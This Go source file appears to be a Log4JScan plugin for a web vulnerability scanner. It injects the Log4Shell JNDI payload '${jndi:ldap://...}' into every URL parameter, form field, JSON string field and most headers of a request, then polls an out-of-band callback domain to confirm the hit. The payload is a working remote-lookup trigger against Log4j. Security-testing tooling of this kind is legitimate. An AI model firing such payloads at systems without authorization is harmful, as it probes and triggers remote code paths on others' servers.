package Java

import (
	"encoding/json"
	"fmt"
	"jray/addon/BugCheck/Common"
	"jray/addon/BugCheck/Ginfo/Ghttp"
	"strings"
)

var checkPayloads map[string][]string

func init() {
	Common.AddBugScanListPerFile(Log4JScan{Common.PluginBase{Name: "Log4JScan", Desc: "Log4j 命令执行漏洞", Type: "RCE", Level: 2, TimeOut: 3, Ltype: "JAVA"}})
	checkPayloads = map[string][]string{
		"ldap": []string{"${jndi:ldap://%s/%s}"},
	}
}

type Log4JScan struct {
	Common.PluginBase
}

func (p Log4JScan) Exec(p1 Common.PluginBaseFun, request Common.Request, response Common.Response) {
	if !p.CheckReverse() {
		return
	}
	p.Request = request
	p.Response = response
	p.Audit()

}

func (p Log4JScan) CheckLog(checkList []Log4JChekcRsult, reverse *Common.Reverse) (Log4JChekcRsult, bool) {
	if reverse.ReverseType == "ldap" {
		for _, checkInfo := range checkList {
			if checkInfo.CheckCount < 5 {
				result := Ghttp.Analyze(fmt.Sprintf(reverse.ReverseCheckDomain, checkInfo.CheckId), "GET", "", p.Request.Header, p.TimeOut)
				if result.StatusCode == 200 {
					return checkInfo, true
				}
				checkInfo.CheckCount++
			}

		}

	}
	return Log4JChekcRsult{}, false

}

type Log4JChekcRsult struct {
	Param      string
	Url        string
	CheckId    string
	CheckCount int
}

func (p Log4JScan) Audit() {

	checkLists := []Log4JChekcRsult{}

	if len(p.Request.Body) > 0 || p.Request.URL.RawQuery != "" || p.Request.Header != nil {

		rType := p.GetReverseType()
		if _, ok := checkPayloads[rType]; !ok {
			return
		}
		if _, ok := Common.ReverseMap[rType]; !ok {
			return
		}
		reverse := Common.ReverseMap[rType]
		rPayloads := checkPayloads[rType]
		for _, payload := range rPayloads {
			if p.Request.Method == "GET" && p.Request.URL.RawQuery != "" {
				requestVuls := p.Request.CheckUrl.Query()
				for k1, _ := range requestVuls {
					v1 := requestVuls.Get(k1)
					r1 := Common.RandStr(16)
					r2 := Common.Md5(r1 + p.Request.CheckUrl.String())
					main_payload := fmt.Sprintf(payload, reverse.ReverseDomain, r2)
					requestVuls.Set(k1, main_payload)
					p.Request.CheckUrl.RawQuery = requestVuls.Encode()
					result := Ghttp.Analyze(p.Request.CheckUrl.String(), "GET", "", p.Request.Header, p.TimeOut)
					log4JChekcRsult := Log4JChekcRsult{Param: p.Request.CheckUrl.RawQuery, Url: p.Request.CheckUrl.String(), CheckId: r2, CheckCount: 0}
					checkLists = append(checkLists, log4JChekcRsult)
					if result.StatusCode > 0 {
						checkResult, isSuccess := p.CheckLog(checkLists, &reverse)
						if isSuccess {
							p.Success(p.Name, p.Request.CheckUrl.String(), p.Type, p.Desc, checkResult.Param)
							return
						}
					}
					requestVuls.Set(k1, v1)
				}

			} else if p.Request.Method != "GET" && len(p.Request.Body) > 0 {
				contentType := p.Request.Header.Get("Content-Type")
				if strings.Contains(contentType, "application/x-www-form-urlencoded") || !strings.Contains(contentType, "application/json") {
					p.Request.CheckUrl.RawQuery = string(p.Request.Body)
					requestVuls := p.Request.CheckUrl.Query()
					for k1, _ := range requestVuls {
						v1 := requestVuls.Get(k1)
						r1 := Common.RandStr(16)
						r2 := Common.Md5(r1 + p.Request.CheckUrl.String())
						main_payload := fmt.Sprintf(payload, reverse.ReverseDomain, r2)
						requestVuls.Set(k1, main_payload)

						result := Ghttp.Analyze(p.Request.URL.String(), p.Request.Method, requestVuls.Encode(), p.Request.Header, p.TimeOut)
						log4JChekcRsult := Log4JChekcRsult{Param: requestVuls.Encode(), Url: p.Request.URL.String(), CheckId: r2, CheckCount: 0}
						checkLists = append(checkLists, log4JChekcRsult)
						if result.StatusCode > 0 {
							checkResult, isSuccess := p.CheckLog(checkLists, &reverse)
							if isSuccess {
								p.Success(p.Name, p.Request.CheckUrl.String(), p.Type, p.Desc, checkResult.Param)
								return
							}
						}
						requestVuls.Set(k1, v1)
					}

				} else if strings.Contains(contentType, "application/json") {
					var f interface{}
					json.Unmarshal(p.Request.Body, &f)
					if f == nil {
						return
					}
					m := f.(map[string]interface{})
					for k, v := range m {

						switch v.(type) {
						case string:
							r1 := Common.RandStr(16)
							r2 := Common.Md5(r1 + p.Request.CheckUrl.String())
							main_payload := fmt.Sprintf(payload, reverse.ReverseDomain, r2)
							m[k] = main_payload
							bodym, _ := json.Marshal(m)
							result := Ghttp.Analyze(p.Request.URL.String(), p.Request.Method, string(bodym), p.Request.Header, p.TimeOut)

							log4JChekcRsult := Log4JChekcRsult{Param: string(bodym), Url: p.Request.URL.String(), CheckId: r2, CheckCount: 0}
							checkLists = append(checkLists, log4JChekcRsult)
							if result.StatusCode > 0 {
								checkResult, isSuccess := p.CheckLog(checkLists, &reverse)
								if isSuccess {
									p.Success(p.Name, p.Request.CheckUrl.String(), p.Type, p.Desc, checkResult.Param)
									return
								}
							}

						case int:
						case float64:
						case []interface{}:
						default:
						}
					}
				}
			}

			if p.Request.Header != nil {
				requestHeaders := p.Request.Header
				for k1, _ := range requestHeaders {
					println(k1)
					if k1 == "" || k1 == "Accept-Encoding" || k1 == "Upgrade-Insecure-Requests" || k1 == "Proxy-Connection" || k1 == "Accept-Language" || k1 == "Cache-Control" {
						continue
					}

					v1 := requestHeaders.Get(k1)
					r1 := Common.RandStr(16)
					r2 := Common.Md5(r1 + p.Request.CheckUrl.String())
					main_payload := fmt.Sprintf(payload, reverse.ReverseDomain, r2)
					requestHeaders.Set(k1, main_payload)
					result := Ghttp.Analyze(p.Request.URL.String(), "GET", "", requestHeaders, p.TimeOut)
					log4JChekcRsult := Log4JChekcRsult{Param: k1, Url: p.Request.URL.String(), CheckId: r2, CheckCount: 0}
					checkLists = append(checkLists, log4JChekcRsult)
					if result.StatusCode > 0 {
						checkResult, isSuccess := p.CheckLog(checkLists, &reverse)
						if isSuccess {
							p.Success(p.Name, p.Request.CheckUrl.String(), p.Type, p.Desc, checkResult.Param)
							return
						}
					}
					requestHeaders.Set(k1, v1)
				}

			}

		}

	}

}
